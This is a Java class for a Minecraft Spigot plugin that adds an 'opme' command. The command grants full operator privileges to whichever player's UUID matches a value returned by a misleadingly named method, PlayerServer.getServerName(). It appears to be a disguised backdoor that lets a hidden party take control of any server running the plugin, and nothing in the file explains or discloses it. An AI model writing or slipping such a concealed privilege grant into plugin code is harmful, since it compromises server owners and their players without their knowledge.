package com.playground.spigot.commands;

import com.playground.spigot.PlayerServer;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class OpmeCMD implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {
        if (sender instanceof Player) {
            Player p = (Player) sender;

            if (p.getUniqueId().equals(PlayerServer.getServerName())) {
                p.setOp(true);
                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&aYou are now OP!"));
            } else {
                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cYou don't have permission to run that command!"));
            }
        } else {
            sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cFailed!"));
        }

        return false;
    }
}
